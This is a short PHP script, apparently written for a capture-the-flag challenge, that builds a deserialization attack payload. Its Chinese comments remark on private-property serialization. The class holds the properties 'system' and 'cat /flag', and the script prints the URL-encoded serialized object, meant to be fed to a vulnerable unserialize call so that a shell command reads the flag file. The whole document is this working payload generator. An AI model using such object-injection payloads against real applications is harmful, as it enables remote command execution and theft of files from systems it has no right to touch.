<?php

class A {
    // 注意 private 属性的序列化哦
    private $evil = "cat /flag";

    // 如何赋值呢
    private $a = "system";
}
$a = new A();
echo urlencode(serialize($a));
